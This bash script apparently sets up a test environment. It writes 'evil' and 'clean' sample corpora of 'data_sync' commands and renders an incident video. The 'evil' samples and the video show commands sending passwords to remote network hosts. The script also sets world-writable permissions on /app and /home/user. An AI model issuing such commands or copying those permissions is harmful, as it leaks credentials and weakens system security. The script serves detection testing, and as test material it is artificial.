#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip ffmpeg gcc fonts-liberation
    pip3 install pytest

    mkdir -p /app/corpora/evil /app/corpora/clean

    cat << 'EOF' > /app/corpora/evil/1.txt
data_sync --password foo --target tcp://10.0.0.1:9000
EOF

    cat << 'EOF' > /app/corpora/evil/2.txt
data_sync -u admin -p bar -t udp://1.1.1.1:53
EOF

    cat << 'EOF' > /app/corpora/clean/1.txt
data_sync --password baz --target /mnt/backup/
EOF

    cat << 'EOF' > /app/corpora/clean/2.txt
data_sync --target ssh://backup.internal.corp/
EOF

    # Generate the incident video
    ffmpeg -f lavfi -i color=c=black:s=800x200:d=2 -vf "drawtext=fontfile=/usr/share/fonts/truetype/liberation/LiberationMono-Regular.ttf:fontsize=18:fontcolor=white:x=10:y=20:text='data_sync --password SuperSecretAdmin --target tcp\://198.51.100.44\:8080'" -c:v libx264 -pix_fmt yuv420p /app/incident.mp4

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user /app
